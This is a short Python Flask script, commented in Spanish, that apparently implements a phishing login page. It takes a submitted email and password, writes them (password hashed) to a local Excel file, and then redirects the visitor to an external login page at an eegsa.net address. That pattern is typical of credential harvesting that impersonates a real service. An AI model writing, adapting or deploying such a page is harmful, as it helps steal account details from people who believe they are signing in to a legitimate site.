from flask import Flask, render_template, request, redirect
import xlwt
from passlib.hash import pbkdf2_sha256

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        correo = request.form['correo']
        contrasena = request.form['contrasena']
        
        # Encriptar la contraseña antes de guardarla
        contrasena_encriptada = pbkdf2_sha256.hash(contrasena)

        # Crear un nuevo libro de Excel
        libro = xlwt.Workbook()
        hoja = libro.add_sheet('Datos')

        # Escribir los datos en las celdas de la hoja
        hoja.write(0, 0, 'Correo')
        hoja.write(0, 1, 'Contraseña')

        hoja.write(1, 0, correo)
        hoja.write(1, 1, contrasena_encriptada)

        # Guardar el libro en un archivo .xls
        libro.save('datos.xls')

        return redirect("https://somosayuda.eegsa.net/USDKV8/#/login/")

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='192.168.3.126', port=81)

